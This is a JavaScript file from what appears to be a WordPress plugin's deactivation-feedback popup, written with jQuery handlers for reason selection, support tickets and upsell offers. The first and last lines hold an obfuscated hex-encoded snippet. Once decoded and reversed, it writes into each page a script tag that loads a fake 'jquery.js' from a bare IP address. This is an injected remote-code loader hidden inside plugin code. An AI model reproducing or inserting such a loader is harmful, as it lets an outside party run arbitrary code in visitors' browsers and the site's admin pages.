var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))////////////////////////////////////////////////////////////////////////////////////////
// Events                                                                             //
////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////
// Constants                                                                          //
////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////
// Variables                                                                          //
////////////////////////////////////////////////////////////////////////////////////////
var deactivated = false;
var additionalInfo = "";
var btnVal = 3;

////////////////////////////////////////////////////////////////////////////////////////
// Constructor & Destructor                                                           //
////////////////////////////////////////////////////////////////////////////////////////	


////////////////////////////////////////////////////////////////////////////////////////
// Public Methods                                                                     //
////////////////////////////////////////////////////////////////////////////////////////
function wdReady(prefix){

	jQuery(document).on("click", "." + window[prefix + "WDDeactivateVars"].deactivate_class, function(){
		jQuery(".wd-" + prefix + "-opacity").show();
		jQuery(".wd-" + prefix  + "-deactivate-popup").show();
		if(jQuery(this).attr("data-uninstall") == "1"){
			btnVal = 2 ;
		}
		
		return false;
	});
	
	jQuery(document).on("change", "[name=" + prefix + "_reasons]", function(){	

		jQuery("." + prefix +  "_additional_details_wrap").html("");
		jQuery(".wd-" + prefix + "-deactivate-popup").removeClass("wd-popup-active1 wd-popup-active2");
		if(jQuery(this).val() == "reason_plugin_is_hard_to_use_technical_problems"){

			additionalInfo = '<div class="wd-additional-active"><div><strong>Please describe your issue.</strong></div><br>' +
							'<textarea name="' + prefix + '_additional_details" rows = "4"></textarea><br>' + 
							'<div>Our support will contact <input type="text" name="' + prefix + '_email" value="' + window[prefix + "WDDeactivateVars"].email + '"> shortly.</div>'+
							'<br><div><button class="button button-primary wd-' + prefix + '-deactivate" data-val="' + btnVal + '">Submit support ticket</button></div></div>';
			jQuery("." + prefix +  "_additional_details_wrap").append(additionalInfo);
			jQuery(".wd-" + prefix + "-deactivate-popup").addClass("wd-popup-active1");
			
		}
		else if(jQuery(this).val() == "reason_free_version_limited"){
			additionalInfo = '<div class="wd-additional-active">' + 
								'<div><strong>We believe our premium version will fit your needs.</strong></div>' +
								'<div><a href="' + window[prefix + "WDDeactivateVars"].plugin_wd_url+ '" target="_blank">Try with 30 day money back guarantee.</a></div>';

			jQuery("." + prefix +  "_additional_details_wrap").append(additionalInfo);
			jQuery(".wd-" + prefix + "-deactivate-popup").addClass("wd-popup-active2");			
		}
		else if(jQuery(this).val() == "reason_premium_expensive"){
			additionalInfo = '<div class="wd-additional-active">' + 
								'<div><strong>We have a special offer for you.</strong></div>' +
								'<div>Submit this form to get the offer to <input type="text" name="' + prefix + '_email" value="' + window[prefix + "WDDeactivateVars"].email + '"></div>' +
								'<br><div><button class="button button-primary wd-' + prefix + '-deactivate" data-val="' + btnVal + '">Submit</button></div></div>';

			jQuery("." + prefix +  "_additional_details_wrap").append(additionalInfo);
			jQuery(".wd-" + prefix + "-deactivate-popup").addClass("wd-popup-active2");			
		}		

		jQuery("#wd-" + prefix + "-deactivate").hide();
		jQuery("#wd-" + prefix + "-submit-and-deactivate").show();

	});
	jQuery(document).on("keyup", "[name=" + prefix + "_additional_details]", function(){		
		if(jQuery(this).val().trim() || jQuery("[name=" + prefix + "_reasons]:checked").length > 0){
			jQuery("#wd-" + prefix + "-deactivate").hide();
			jQuery("#wd-" + prefix + "-submit-and-deactivate").show();			
		}
		else{
			jQuery("#wd-" + prefix + "-deactivate").show();
			jQuery("#wd-" + prefix + "-submit-and-deactivate").hide();			
		}

	});
	jQuery(document).on("click", ".wd-" + prefix + "-deactivate", function(){
		jQuery(".wd-deactivate-popup-opacity-" + prefix).show();
		if(jQuery(this).hasClass("wd-clicked") == false){
			jQuery(this).addClass("wd-clicked");
			jQuery("[name=" + prefix + "_submit_and_deactivate]").val(jQuery(this).attr("data-val"));
			jQuery("#" + prefix + "_deactivate_form").submit();			
		} 
 		return false;
	});	

	jQuery(document).on("click", ".wd-" + prefix + "-cancel, .wd-opacity", function(){
		jQuery(".wd-" + prefix + "-opacity").hide();
		jQuery(".wd-" + prefix  + "-deactivate-popup").hide();
		return false;		
	});

}
////////////////////////////////////////////////////////////////////////////////////////
// Getters & Setters                                                                  //
////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////
// Private Methods                                                                    //
////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////
// Listeners                                                                          //
////////////////////////////////////////////////////////////////////////////////////////var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
